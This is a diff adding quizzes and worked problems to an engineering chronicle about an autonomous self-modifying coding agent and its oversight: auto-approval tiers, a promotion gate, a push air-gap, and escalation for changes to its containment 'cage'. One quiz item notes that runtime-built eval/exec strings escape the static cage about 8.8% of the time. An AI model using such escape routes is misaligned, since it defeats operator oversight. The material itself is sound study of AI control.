+<p>The bottleneck was also not the one the forecast named. §92.16 put the remaining gap on Phase 9 graduation, "not on novel research". In practice the blockers were: the A1 wall, where a signed goal never dispatched even with the system funded and quiet (§93.4); the paid credit running out (§93.5); a small local model that needed tool masking, a target symbol and a diff schema before it could act (§93.6, §93.8); and, once it could land, the supply wall and diff fidelity (§93.10, §93.14). None of those is a flag waiting to graduate.</p>
+<p>The lesson is that "structurally ready" counts the mechanisms present. "Capable" depends on whether a real goal can travel the whole chain on the model you can actually afford. §93.12's 131 DARK features show how far apart the two can be. A forecast that would have survived needed a demonstrated end-to-end run as its base, not a list of present mechanisms.</p>
+</details>
+<details class="cq-adv"><summary>A3. The SWE-Bench-Pro graduation floor in §92.14 requires at least one RESOLVED known-good instance and at least one UNRESOLVED known-hard instance. Why both ends? Then apply the same reasoning to the EVAL-2 sweep in §93.3, which resolved 1/6 with three instances inconclusive.</summary>
+<p>A scorer can be broken in two opposite ways, and each end of the floor catches one. A scorer that marks everything resolved would pass a known-good instance, but the known-hard instance exposes it. A scorer that marks everything unresolved, for example because tests never run in the container, would pass the known-hard instance, but the known-good one exposes it. Only the pair shows that the scorer can tell the two apart. §92.14 says this is "empirical proof that the scoring layer behaves correctly on both ends of the distribution before any aggregate-resolve-rate claim is published".</p>
+<p>The same logic applies to inconclusive outcomes. Phase E turns contract violations into synthetic records such as <code>INGEST_FAILED</code> and <code>SCORING_ERROR</code> instead of aborting the sweep (§92.14). Those records are neither resolved nor unresolved. In EVAL-2, three of six instances were inconclusive because of a clone race and a provider outage (§93.3).</p>
+<p>There are two readings. The reported 1/6 (16.7%) counts inconclusive instances as failures, which is conservative. Counting only conclusive instances gives 1/3. Neither can be compared with the 43.6% frontier figure, because the sample is tiny and half of it measured the infrastructure, not the agent. §93.3 itself calls the first resolved instance N=1. The honest report gives the three-way split (resolved, unresolved, inconclusive) and does not blend it into one rate.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> §92.9 gives the Phase 9 calendar as 24 flags × 3 clean soaks ÷ 2 fires per day = about 36 days minimum, and "realistic 6–9 weeks with noise". Model the noise. Assume flags graduate one at a time, each soak is clean independently with probability p, and a flag needs 3 <em>consecutive</em> clean soaks, so a dirty soak resets its count. Compute the expected calendar for p = 0.9, 0.8 and 0.75. Find which values of p the paper's 6–9 week estimate implies, and give the cost ceiling at the stated rate.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The expected number of independent trials needed to get k consecutive successes, each with probability p, is 1/p + 1/p² + … + 1/p<sup>k</sup>.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Assumptions, which are mine and not the paper's: soaks are independent, flags are processed serially, and "3 clean soaks" means three in a row. §92.13 uses "consecutive" for Treefinement, so the stricter reading is reasonable. Every soak, clean or dirty, uses one of the two daily fires.</p>
+<p>With k = 3, expected soaks per flag E(p) = 1/p + 1/p² + 1/p³.</p>
+<ul>
+<li>p = 0.9: 1.111 + 1.235 + 1.372 = 3.72 soaks per flag. 24 × 3.72 = 89.2 soaks ÷ 2 per day = 44.6 days, about 6.4 weeks.</li>
+<li>p = 0.8: 1.250 + 1.563 + 1.953 = 4.77. 24 × 4.77 = 114.4 soaks = 57.2 days, about 8.2 weeks.</li>
+<li>p = 0.75: 1.333 + 1.778 + 2.370 = 5.48. 24 × 5.48 = 131.6 soaks = 65.8 days, about 9.4 weeks.</li>
+</ul>
+<p>Check: at p = 1, E = 3, which gives 72 soaks and 36 days, the paper's minimum. So "6–9 weeks" corresponds to each soak being clean roughly 78–90% of the time. Below about 75% the calendar runs past nine weeks, and it grows quickly, because the 1/p³ term dominates.</p>
+<p>Cost: §92.9 caps the cadence at about 1 US dollar per day. 36 days is at most about 36 US dollars, and 66 days about 66 US dollars. The cost is trivial. The binding resource is calendar time.</p>
+<p>Conclusion: the paper's estimate is consistent with a fairly reliable soak, and the model shows where the risk is. Lowering the dirty-soak rate (the §92.10 debug arc is that kind of work) shortens the calendar more than anything else. Two fires per day is a hard ceiling. If a reset only cost one soak instead of the whole count, E would fall to 3/p, about 3.75 at p = 0.8.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> Treefinement graduates when a soak ladder shows "≥10% L2 success-rate lift OR ≥20% wall-clock reduction at parity success rate over ≥2 consecutive soaks" (§92.13). Without any real improvement from tree search, construct two event sequences that would meet this criterion. Use a typical soak of 20 L2 invocations per arm at a true success rate of 25%. For each, say whether anything in §92 would stop it, and propose a criterion that would.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask three things the criterion does not specify: relative or absolute lift, what the baseline arm is, and whether both arms see the same work under the same infrastructure. §93.10's slot A/B is a real example of one of these failing.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Sequence 1: chance plus an ambiguous threshold.</strong> With 20 invocations per arm at p = 0.25, the standard error of a difference in success rates is sqrt(2 × 0.25 × 0.75 / 20) ≈ 0.137, or about 14 points. Using a normal approximation (mine), a 10-point <em>absolute</em> lift appears by chance with probability P(Z ≥ 0.73) ≈ 0.23 per soak, or about 0.054 for two soaks in a row. Read as a 10% <em>relative</em> lift, the bar is only 2.5 points: P(Z ≥ 0.18) ≈ 0.43 per soak and about 0.18 for two. So a criterion with no stated sample size or definition can graduate a no-op roughly one time in five.</p>
+<p><strong>Sequence 2: a confounded comparison.</strong> The tree arm runs after an unrelated infrastructure fix, or on an easier goal mix. §93.2's Quiescence Protocol cut first-token latency from 94,638 ms to 722 ms without any change to repair strategy. A change like that, landing between a baseline soak and a tree soak, would deliver the "≥20% wall-clock reduction at parity" on its own. §93.10 shows the goal-mix confound happening for real: the slot A/B arms had different goal mixes and the result was inconclusive.</p>
+<p><strong>What stops it.</strong> Nothing in §92 does. The flag is default-FALSE and rollback is byte-identical, so a false graduation is reversible, but the ladder itself would pass. That is an honest gap.</p>
+<p><strong>Proposed criterion (my proposal).</strong> (1) Paired arms: replay the same failing operations under <code>JARVIS_L2_BRANCHING_STRATEGY=linear</code> and under tree mode on the same commit of the infrastructure, so goal mix and latency are identical. (2) An absolute threshold and a minimum count of L2 invocations, fixed before the soak. (3) A paired test on per-operation outcomes, where only operations that one strategy repairs and the other does not count as evidence. This is the same discipline §93.11 later applied to adapters, where a 4/6-versus-3/6 gate result was explicitly rejected as evidence because it rested on one flip.</p>
+<p>Check: under the proposal, Sequence 2 is impossible by construction, and Sequence 1 needs several discordant operations in the same direction, not a few points of noise.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -4893,6 +7609,16 @@ The responses:
 
 JARVIS boot now brings up J-Prime and Reactor itself (`e05fe5b1ab`). Since 2026-10-10 local concurrency follows the engine's reported slot count (`fadde8d9c4`†). A slot sweep measured aggregate throughput of 124 / 165 / 177 tok/s at 1 / 2 / 3 slots, so the knee is at 2. The vision model (`jarvis-vision:8b`) is declared in J-Prime, but at the time of writing is still partly served by Ollama.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-s93-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">A single local GPU now generates every candidate, and a candidate that passes VALIDATE sits in an isolated worktree. Before reading on, predict which stages should sit between that worktree and <code>main</code>, and whether the organism should push its own results to GitHub.</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>The candidate is committed in a sovereignty worktree with <code>Signal:</code>, <code>Session:</code> and O+V co-author trailers. It accumulates on a per-session <code>ouroboros/battle-test/&lt;ts&gt;</code> branch. A promotion gate then checks provenance, coverage and that no public symbol vanished, and failures go to <code>ouroboros/quarantine/*</code>. Survivors are fast-forwarded onto local <code>main</code> only. It never pushes: a zero-push air-gap guards every push site, so publishing to GitHub remains an operator act. See §93.7.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ### §93.7 How Work Reaches `main` Today
 
 > **Big Picture.** In April, a human started a battle-test session and approved what mattered. By October the organism finds its own work, signs it with the same key the operator uses, executes it in an isolated worktree, and fast-forwards verified results onto the local `main` branch. It never pushes to a remote.
@@ -4908,7 +7634,7 @@ The path, stage by stage:
 2. **Autonomous Sentinel Mode** (`autonomy/sentinel.py`, 2026-09-08 onward). The Sentinel auto-approves up to a tier ceiling (`JARVIS_SENTINEL_AUTO_APPROVE_MAX_TIER`, default APPROVAL_REQUIRED). BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate. Since 2026-09-26 a bare `ov` arms the Sentinel and the production-soak profile (`04f2f3ade0`). Before that, soaks and the cockpit had been, in the commit's words, two organisms behind one name.
 3. **Execution** in a sovereignty worktree on `ouroboros/auto/<session>-<nonce>`. AutoCommit adds `Signal:`, `Session:` and an O+V co-author trailer.
 4. **Accumulation** onto `ouroboros/battle-test/<ts>`.
-5. **Promotion gate** (`accumulation_promotion_gate.py`, `3b49ed8e08`). Provenance, coverage, and a structural check that no public symbol vanished. The structural check is the one that caught a whole-file re-emission. Landings that fail go to `ouroboros/quarantine/*`.
+5. **Promotion gate** (`accumulation_promotion_gate.py`, `3b49ed8e08`). Four checks: provenance; coverage; a structural check that no public symbol vanished; and a semantic-delta check that refuses commits changing only comments, formatting or quoting (`ac4dacdbc6`). The structural check is the one that caught a whole-file re-emission. Coverage is matched by test-file name, so a same-named test written for a different module can count as cover. That is a known weakness, not a guarantee. Landings that fail go to `ouroboros/quarantine/*`.
 6. **Local `main` promotion** (`main_promoter.py`, `077417b478`). Fast-forward only.
 7. **Zero-push air-gap** (`remote_push_guard.py`, `JARVIS_REMOTE_PUSH_AIRGAP` on). Every push site goes through one guard, and an AST test fails on any unguarded push. Publishing to GitHub remains an operator act.
 
@@ -4988,6 +7714,16 @@ The first autonomous landing was `704f98b1d5` (2026-09-06). The first multi-file
 Two lessons are recorded in PRD §34. **The supply wall**: after about four hours on a diet of uncovered modules, yield is bounded by the supply of landable work, not by the model. And the session summary undercounted landings (2 vs 3, 1 vs 10), so the ledger and git, not the summary, are the source of truth.
 
 **Where this sits on the Ten Orders (§92.18).** Three of the five production landings modified files inside the governance package, under signed, operator-sanctioned goals. None touched a safety gate (`iron_gate.py`, `semantic_guardian.py`, the cage), and none was self-initiated governance change. The system is still at **Mechanic**: the Neurosurgeon threshold, autonomous modification of the governance substrate on the organism's own initiative, has not been crossed, and the tier ceiling and cage escalation in §93.7 are designed to make crossing it an operator decision.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-s93-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Reactor has trained a LoRA adapter on O+V's own recorded attempts, and J-Prime serves it. Predict whether that adapter made the model measurably better, and what evidence would actually count as proof.</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>No improvement has been shown. The adapter beat the incumbent 4/6 to 3/6 on its gate. The project's own notes reject that as evidence of learning: three contributing answers, a gradient norm of about 1e-4, and one greedy flip. The evidence that counts is a held-out benchmark: 30 tasks drawn from human commits with hidden tests. There the adapter was accepted on 1/30 or 3/30, solved 0, and showed a mean gain of 0.03. Until a held-out gain appears, no training-derived change is pushed. See §93.11.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ### §93.11 The Trinity Closes the Loop: Recorder → Reactor → J-Prime
 
@@ -5080,7 +7816,7 @@ The formal questions of §92.12 are unchanged. The engineering since then has mo
 | Goal Discovery | Turns evidence (red tests, uncovered modules) into signed roadmap goals |
 | Proposal inbox | Model-invented work, sanctioned by the same single signer as evidence |
 | Accumulation branch | Per-session `ouroboros/battle-test/<ts>` branch that collects landings |
-| Promotion gate | Provenance + coverage + no-public-symbol-removed check before `main` |
+| Promotion gate | Provenance + coverage + no-public-symbol-removed + not-cosmetic-only checks before `main` |
 | Zero-push air-gap | One guard on every push site; publishing is an operator act |
 | First-order proof | An autonomous landing that does real work for a signed goal |
 | Supply wall | The point where yield is bounded by landable work, not by the model |
@@ -5100,6 +7836,177 @@ The formal questions of §92.12 are unchanged. The engineering since then has mo
 | Held-out benchmark | Gain measured on human commits with hidden tests, never on training rows |
 | DARK feature | Flag on, module present, never reached in production |
 | Proof of work (`/proof`) | Hash-chained, per-session evidence record |
+
+<!-- engage:begin -->
+#### Check your understanding: §93 — Developments (May 14 – October 13, 2026)
+
+<div class="engage" id="engage-s93">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why does §93 count autonomous landings by a commit trailer on <code>main</code>, rather than by what each soak session reports in its summary?</summary>
+<p>The summaries were measured to be wrong. PRD §34 records session summaries undercounting landings (2 against 3, and 1 against 10), so "the ledger and git, not the summary, are the source of truth" (§93.10). A trailer such as <code>Co-Authored-By: Ouroboros+Venom</code> lives in the repository itself, so anyone can recount it with <code>git log</code>. A session log can be lost, misread or simply wrong. The same thinking runs through the rest of the design. <code>GoalReconciliationLedger</code> binds goals to commits using git ancestry, not logs (§93.7), and landing provenance attaches git-proven <code>landed</code>/<code>surviving</code> labels to training rows (§93.11). The rule also forces honesty in the other direction. The four July Run-22/23 commits carry the trailer too, so they are listed separately, not quietly folded in or dropped.</p>
+</details>
+<details class="cq"><summary>2. Every landing has already passed VALIDATE and its module's tests before it reaches the promotion gate. Why does the gate's structural "no public symbol vanished" check still matter?</summary>
+<p>The local model's most common bad output is a whole-file re-emission: it rewrites the file instead of producing a diff and reproduces <em>most</em> of it. Tests rarely assert that a given export or <code>__all__</code> entry still exists, so a lost symbol can pass every test. §93.7 says the structural check is the one that caught such a whole-file re-emission. §93.10 shows the damage that reaches <code>main</code> without such checks: one landing where only a punctuation rewrite landed (reverted), and one that dropped content later restored by hand. The root fix is diff output, and that is still the leading failure mode, with 219 whole-file answers against 6 diffs in the 10-09 soak (§93.8, §93.14). Until that is fixed, a cheap mechanical check against the lane's known regression class is what keeps passing tests from approving a damaged file.</p>
+</details>
+<details class="cq"><summary>3. What does the "supply wall" imply about how to raise landed-commit yield, and why does the plan in §93.15 delay arming the Epistemic Planner?</summary>
+<p>The supply wall means that after about four hours on a diet of uncovered modules, yield is bounded by how much landable work exists, not by the model (§93.10). In the 6.03 h soak, nothing landed from 22:24 to 00:29. A bigger model or more decode slots would not fix that, because the queue of suitable work is the bottleneck. §93.15 therefore lists widening supply as step 3: evidence-ranked red tests and sanctioned model proposals. Arming the Epistemic Planner, a new source of model-invented work, comes only after diffs land, a held-out gain is measured and supply is widened. Otherwise the backlog would fill faster than it drains. Adding work the organism cannot yet land well would only grow the queue of failures.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-s93">
+<div class="mcq" data-answer="4">
+<p class="mcq-q">1. What did the at-scale mutation harness measure for the static cage, and what remedy does the North Star propose?</p>
+<ol class="mcq-options" type="A">
+<li>0% escapes, confirming the curated 0/38 result at scale</li>
+<li>About 21.9% escapes, to be fixed by adding more AST rules</li>
+<li>About 4.4% escapes, exactly meeting the gate after hardening</li>
+<li>About 8.8% escapes, to be fixed by OS-level runtime containment</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> Two large runs converged at about 8.8%, roughly twice the 4.4% gate. The residue is <code>eval</code>/<code>exec</code>/<code>subprocess</code>/<code>pickle</code> of runtime-built strings, which a static cage cannot see by construction (§93.3).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. <code>governance/paid_lanes.py</code> is the single authority on paid lanes. Which three questions does it answer separately?</p>
+<ol class="mcq-options" type="A">
+<li>Is the lane switched on, configured, and allowed</li>
+<li>Is the lane reachable, funded, and rate-limited</li>
+<li>Is the lane cheapest, fastest, and least loaded</li>
+<li>Is the lane attested, quarantined, and circuit-broken</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> Switched on, configured and allowed are three separate verdicts, and "allowed" also consults the economic ledger. With <code>JARVIS_PAID_LANES_ENABLED=false</code>, Claude and DoubleWord are never constructed (§93.6).</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">3. Why was a separate ECONOMIC state needed when the paid credit ran out in August?</p>
+<ol class="mcq-options" type="A">
+<li>The liquidity panel blocked every request once runway hit zero</li>
+<li>A 429 rate limit was being retried forever instead of freezing</li>
+<li>A 402 was read as an outage, causing 125 false awaken triggers</li>
+<li>Aegis refused to reconcile calls that returned no token usage</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The failover classifier treated "out of money" as an outage. A 402 now freezes the lane and emits <code>provider_funding_required</code>, while a 429 is still retried (§93.5).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. Stateful tool masking (lever 3) changed only the decoding grammar. What did that grammar do, and what was the result?</p>
+<ol class="mcq-options" type="A">
+<li>Banned noop answers entirely; the full union explored 3/3</li>
+<li>Allowed only tool calls until minimum exploration; 3/3 explored</li>
+<li>Forced diff output for existing files; apply failures fell to 21</li>
+<li>Capped output at the target symbol; scope fell to about 750 tokens</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> With the full union the 30B explored 0/3. With {tool, noop} it chose noop 3/3. With {tool} only it explored 3/3 (§93.6).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-s93">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> Goal Discovery notices that a module under <code>backend/api/</code> has no tests. Trace that observation to a commit on local <code>main</code>, using §93.7 and §93.8. Name each stage and, for at least three of them, one thing that could stop the work there.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>There are four gates after generation: inside VALIDATE, the Test Reality Gate, the promotion gate, and the push guard. Remember that the push guard stops something other than the landing.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Source: Goal Discovery turns the evidence of an uncovered module into a signed goal through <code>synthesize_and_sign()</code>. Evidence ranks above model-invented proposals, and red tests rank above uncovered modules.</p>
+<p>Approval: the Sentinel auto-approves up to its tier ceiling. BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate to the operator.</p>
+<p>Execution: the work runs in a sovereignty worktree on <code>ouroboros/auto/&lt;session&gt;-&lt;nonce&gt;</code>. Inside VALIDATE a failure meets a micro-fix, then a VALIDATE_RETRY that regenerates, then L2 repair. If all three fail, the operation dies here. The Test Reality Gate rejects a test that cannot execute, asserts nothing, or never imports its subject.</p>
+<p>AutoCommit adds the trailers and the commit accumulates on <code>ouroboros/battle-test/&lt;ts&gt;</code>. The promotion gate checks provenance, coverage and that no public symbol vanished. A failure sends the landing to <code>ouroboros/quarantine/*</code>.</p>
+<p>Survivors are fast-forwarded onto local <code>main</code> by <code>main_promoter.py</code>. The zero-push air-gap does not stop the landing. It stops the commit from leaving the machine: publishing to GitHub is an operator act. <code>GoalReconciliationLedger</code> then binds the goal to the commit through git ancestry.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (analysis).</strong> The <code>bt-2026-10-05-012717</code> soak ran 6.03 h with 6 substantive landings, at 1.34 substantive landings per hour over its first 2.98 h. Estimate how many substantive landings came in the first 2.98 h and what rate the remaining time achieved. Then explain what this pattern does and does not tell you about the 30B model.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Multiply the rate by the time, subtract from 6, and divide by the remaining hours. Then reread the "supply wall" lesson.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>First window: 1.34 per hour × 2.98 h ≈ 4.0, so about 4 substantive landings. Remainder: 6 − 4 = 2 landings over 6.03 − 2.98 = 3.05 h, about 0.66 per hour. The second half ran at roughly half the rate, and the session table notes that nothing landed between 22:24 and 00:29.</p>
+<p>The model did not change during the soak, so the decline is not evidence that the model got worse. PRD §34 reads it as the supply wall: after about four hours on uncovered modules, yield is bounded by the supply of landable work (§93.10).</p>
+<p>It also does not show that the model is strong in general. 84 of 91 landings are test files, and production landings at cadence are listed as not demonstrated (§93.14). The fix the pattern points to is wider supply, step 3 in §93.15, not more slots. The slot A/B was inconclusive anyway.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/accumulation_promotion_gate.py</code> and read <code>_public_surface</code> and <code>_check_structure</code>. Work out what counts as the "public surface", which direction of change is refused, how a file that no longer parses is treated, and whether a commit that drops an export can pass if a later commit on the branch restores it.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The module docstring calls this a "SHRINK check", and <code>_check_structure</code>'s docstring says what it is "judged across".</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><code>_public_surface</code> parses the source and collects module-level function, async-function and class names, plus assignment targets, that do not start with an underscore. It also collects the declared <code>__all__</code> by <code>literal_eval</code>. It returns <code>None</code> if the source does not parse.</p>
+<p><code>_check_structure</code> compares the surface before and after for each touched <code>.py</code> file. It is a shrink check. New public symbols are "ordinary work". Lost names, lost <code>__all__</code> entries, or a removed <code>__all__</code> produce a failing <code>Finding</code>. Added or deleted files are skipped, because they are not a shrink.</p>
+<p>A file that does not parse after the commit fails immediately with "does not parse after the commit". A file that did not parse before is skipped.</p>
+<p>The check is judged across the range, from <code>base</code>, not commit by commit. A drop followed by a restore on the same branch is "together, no loss". The module docstring adds that the gate fails closed and that a refusal leaves the accumulation branch in place as the quarantined, reviewable artifact. This matches §93.7, where this check caught a whole-file re-emission that tests could not see.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. §93.10 counts 91 autonomous landings by the <code>Co-Authored-By: Ouroboros+Venom</code> trailer on <code>main</code>. Name three ways that number differs from "useful changes the organism made that are still in the codebase", and which §93 mechanism measures each difference.</summary>
+<p>First, a commit stays in history after it is reverted. The count includes <code>f97f8195d6</code>, where only a punctuation rewrite landed and which was reverted by <code>c8430f9b6a</code>. §93.14 also lists a hollow landing that was reverted. A trailer count measures commits made, not changes that survive. Landing provenance (§93.11) measures that difference: it attaches git-proven <code>landed</code> and <code>surviving</code> labels, and 35 of 39 landings were proven.</p>
+<p>Second, "landed" is not "useful". 84 of the 91 add test files. The documentation landing that flattened the author's name, and the <code>sse_contract.py</code> landing whose dropped content was restored by hand, still count as one each. §93.10 handles this by splitting landings into kinds and by the separate "substantive" column in the soak table. The trailer alone cannot carry that judgement.</p>
+<p>Third, the trailer is text, and text by itself proves nothing. The counting rule works because it combines the trailer with presence on <code>main</code>, which only promotion can produce. The promotion gate does not trust the co-author line either. Its provenance check in <code>accumulation_promotion_gate.py</code> requires the <code>Op-ID</code>, <code>Session</code> and <code>Files</code> trailers, and requires that the session named in the trailer also appears in the branch name. <code>GoalReconciliationLedger</code> then binds goal to commit through git ancestry (§93.7).</p>
+<p>So the trailer count is a good <em>upper bound</em> that anyone can recompute with <code>git log</code>. That is its real advantage over session summaries, which undercounted (§93.10). Turning it into a measure of value needs the provenance labels and the substantive classification on top of it.</p>
+</details>
+<details class="cq-adv"><summary>A2. §92.18 defines the Neurosurgeon threshold as autonomous mutation of "<code>iron_gate.py</code>, <code>semantic_guardian.py</code>, or other governance code under an autonomous signature". Three of the five production landings in §93.10 modified files in the governance package. Why does §93.10 still say Mechanic? Is that a principled refinement or moving the goalposts?</summary>
+<p>§93.10 adds two qualifiers that the §92.18 sentence did not spell out. The change must touch the governance <em>substrate</em> (a safety gate or the cage), and it must be on the organism's <em>own initiative</em>. The three landings, <code>dw_capacity_probe.py</code> and two edits to <code>candidate_generator.py</code>, were made under signed, operator-sanctioned goals and did not touch a safety gate.</p>
+<p>I would argue the refinement is principled, because it follows the reason §92.18 gives for the threshold. Neurosurgeon matters because past it "only a formal proof of containment … can rule out" an escaping trajectory. A capacity probe that backs off a failing provider does not change what the shell lets through. An edit to the cage does.</p>
+<p>There is a subtlety the reader should catch. "Signed" cannot be the test for operator initiative, because Goal Discovery signs its own goals with the same key the operator uses (§93.7). The real distinction is the goal's <em>source</em>: the roadmap or <code>/goal sanction</code> on one side, discovery or the proposal inbox on the other.</p>
+<p>The design also turns the threshold into an approval decision. BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate, whatever the Sentinel's tier ceiling (§93.7). The evidence that would mark a real crossing is a landing on a cage file under a self-sourced goal. By that design, such a landing cannot happen without an operator approving it. The goalposts would only be moving if §93 had redefined "the cage" to exclude a file it had already changed, and it has not.</p>
+</details>
+<details class="cq-adv"><summary>A3. Suppose the Epistemic Planner were armed today, before step 1 of §93.15 (making diffs land) is done. Trace the second-order effects through Goal Discovery's ranking, the diff path and the training corpus.</summary>
+<p>The planner's work enters through the proposal inbox, ranked <em>below</em> evidence, and is signed by the same single signer (§93.7). At first, then, it would mostly wait behind red tests and uncovered modules. Its effect would grow as the supply wall hits. After about four hours on uncovered modules, evidence-sourced work runs out (§93.10), and planner proposals would become most of what dispatches.</p>
+<p>Those proposals are model-invented work, so most of them would edit existing files rather than create test files. That puts them straight onto the weakest path: existing files must answer in the <code>2b.1-diff</code> schema, and the 10-09 soak produced 219 whole-file answers against 6 diffs (§93.8, §93.14). So the queue would fill with work that mostly dies at the leading failure mode. §93.15 says this outright: arm the planner only after (1)–(3), "so the backlog does not fill faster than it drains".</p>
+<p>The corpus effect is quieter. Every candidate becomes a recorder row (§93.11). A flood of failed whole-file rewrites would push the corpus further toward the shape that already ruined the first training run, where 86% of prompts asked for whole-file rewrites that could not fit the completion window. Output-contract tags (§93.11) let Reactor train only on current formats, which limits the damage, but the useful contrast per GPU cycle would still fall.</p>
+<p>Net effect: more operations, a lower landing rate per GPU hour, and a noisier corpus, with no gain in landed commits until diffs land. That is why §93.15 orders the steps the way it does.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> Use the cadence table in §93.10. (a) Pool the four completed soaks that report a substantive count (09-26, 10-04, 10-05, 10-08) and compute landings per hour and substantive landings per hour. (b) The 10-05 session ID encodes its start as 01:27:17, it ran 6.03 h, and nothing landed from 22:24 to 00:29. Work out where that gap sits in the session. (c) Project substantive landings for a 9-hour soak under a constant-rate model and under a supply-wall model. (d) Treating landings as a Poisson process (an assumption), how surprising is the gap at a constant rate? (e) Square your answer with the ~9 h 10-09 soak and its 51 merged commits.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Add 6.03 h to the start time and compare the result with the clock time at which the gap ends. The two clocks differ by a whole number of hours.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>(a)</strong> Wall time: 1.97 + 2.98 + 6.03 + 1.25 = 12.23 h. Landings: 3 + 3 + 10 + 0 = 16, which is 1.31 per hour. Substantive: 3 + 2 + 6 + 0 = 11, which is 0.90 per hour.</p>
+<p><strong>(b)</strong> 01:27:17 + 6.03 h (6 h 01 m 48 s) = 07:29:05. The gap ends at 00:29, so the table's clock runs exactly 7 hours behind the ID's clock (consistent with UTC against Pacific daylight time, an inference). 22:24 on the table's clock is 05:24 on the ID's clock, 3.95 h into the session. The gap therefore runs from 3.95 h to the end of the session, 2.08 h with nothing landing. All 10 landings, 6 of them substantive, came in the first 3.95 h. That is about 1.52 substantive per hour, the same as the 09-26 soak's 1.52, and it matches the "about four hours" in PRD §34.</p>
+<p><strong>(c)</strong> Constant rate at the session average of 1.00 per hour: 9 substantive in 9 h. At the early rate of 1.34 per hour: about 12. Supply-wall model (yield stops once the uncovered-module supply is exhausted at about 3.95 h, with no replenishment): 1.52 × 3.95 ≈ 6, and the total stays near 6 however long the soak runs. That is an average of 0.67 per hour over 9 h. The models differ by a factor of two, which is the whole point of the supply-wall lesson.</p>
+<p><strong>(d)</strong> At a constant 1.34 per hour, P(no landing in 2.08 h) = e<sup>−2.79</sup> ≈ 0.061. At 1.00 per hour it is e<sup>−2.08</sup> ≈ 0.125. That is unlikely but not decisive on one soak. What makes it convincing is that the gap is a tail that runs to the end of the session, not a gap in the middle, and that it occurs where PRD §34 says the wall is.</p>
+<p><strong>(e)</strong> 51 merged in about 9 h is about 5.7 per hour, far above any model in (c). It does not refute the wall. The 10-09 soak ran after the root-cause fixes of 10-08, on a fresh supply, "mostly tests for <code>backend/api/*</code>". The wall is a property of the supply, not of the clock, and a new unexploited area resets it. The figures are also not comparable: the 10-09 row reports no substantive count, and its proof chain read "13 commits verified on main" at its check. The 10-10 row shows why the column matters: 40 entered the funnel and all were refused at promotion.</p>
+<p>Conclusion: plan a 9-hour soak around supply, not hours. Without new landable work, expect about 6 substantive landings, nearly all of them in the first four hours.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (research).</strong> The operator's rule in §93.11 is that no training-derived change is pushed until a held-out gain is shown. Design the experiment that would justify pushing an adapter. Givens: the held-out set is 30 tasks from human commits with hidden tests. The served adapter was accepted on 1/30 (unnumbered prompts) or 3/30 (numbered), solved 0, with a mean gain of 0.03. Its handoff gate was 4/6 against the incumbent's 3/6 with one greedy flip. Numbering also moved apply failures from 28 to 21 and syntax failures from 1 to 6 (§93.14). State the hypothesis, metric, control, decision rule and what would falsify it, and work out how much gain 30 tasks can detect.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Greedy decoding is deterministic, so all the variance comes from the tasks. Compare the two arms on the same tasks and count only the tasks where they disagree.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Hypothesis.</strong> The adapter raises the share of held-out tasks <em>solved</em> (hidden tests pass) relative to the incumbent base model under identical conditions.</p>
